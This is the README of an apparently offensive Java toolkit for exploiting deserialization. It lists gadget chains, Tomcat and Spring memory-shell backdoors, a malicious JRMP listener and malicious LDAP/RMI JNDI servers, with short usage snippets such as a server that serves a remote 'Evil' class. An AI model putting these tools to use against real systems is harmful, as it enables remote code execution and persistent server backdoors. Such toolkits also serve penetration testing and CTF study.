

# Java-unser-utils

使用java8编译。

使用方式：

idea打开源码，使用maven的package，得到一个jar。

直接maven导入。

```
<dependency>
    <groupId>cn.org.unk</groupId>
    <artifactId>Java-unser-utils</artifactId>
    <version>1.0-SNAPSHOT</version>
    <scope>system</scope>
    <systemPath>E:/ideaProjects/Java-unser-utils/target/Java-unser-utils-1.0-SNAPSHOT.jar</systemPath>
</dependency>
```





## Gadget

内置常用反序列化gadget：

- getJdbcRowSetImpl

  getter -> jndi

- getLDAPAttribute

  getter -> jndi

- getSingnedObject

- getTemplateImpl

  - getTemplateImpl("calc");
  - getTemplateImpl( byteCode to load );

- getPKCS9Attributes_BCEL

  toString -> load BCEL bytecode

- getJRMPPayloadJDK8u231

  readObject -> 发送JRMP请求

- getJRMPPayloadJDK8u241

  readObject -> 发送JRMP请求

- getPOJONodeStableProxy

  用JdkDynamicAopProxy封装对象（一般是TemplatesImpl），使得POJONode可稳定触发getter。

- getStyledEditorKit.AlignmentAction

  - getAlignmentActionForToString

    readObject -> toString

  - getAlignmentActionForEquals

    readObject -> equals

- getBadAttributeValueExpException

  readObject -> toString

- getEventListenerList

  readObject -> toString

- getAnnotationInvocationHandler

- getHashMap_HotSwappable_XString

  readObject -> toString

- getHashMap_XString

  readObject -> toString

- getURLDNS



## Util

- serialize
- unserialize
- createWithoutConstructor
- createWithConstructor
- setFieldValue
- byte2Hex
- file2ByteArray
- byteArray2File
- inputStream2ByteArray



## Memshell

常用的内存马。

注意，这些内存马需要使用者自行编译， 注意不能带包名，才能被加载。

### Tomcat

FilterShell2222

ListenerShell

ServletShell

### Spring

EvilController

EvilControllerHigherVersion

EvilInterceptor



## JRPM Server

- JRMPListener

  启动一个恶意JRMP服务器。

  使用方式：

  ```
  new JRMPListener(port,"your_Object_to_unserialize").start();
  ```

## JNDI Server

- LDAPRefServer

  低版本JNDI，ref方式，ldap路线

  ```
  new LDAPRefServer(7777,"http://127.0.0.1:8000/#Evil").start();
  ```

- RMIRefServer

  低版本JNDI，ref方式，rmi路线

- LDAPSerializedDataServer

  打高版本JNDI触发反序列化

  ```
  new LDAPSerializedDataServer(7777,Util.serialize(new Bean())).start();
  ```

  客户端连接方式：

  ```
  new InitialContext().lookup("ldap://ip:7777/anything_is_ok");
  ```

  

  









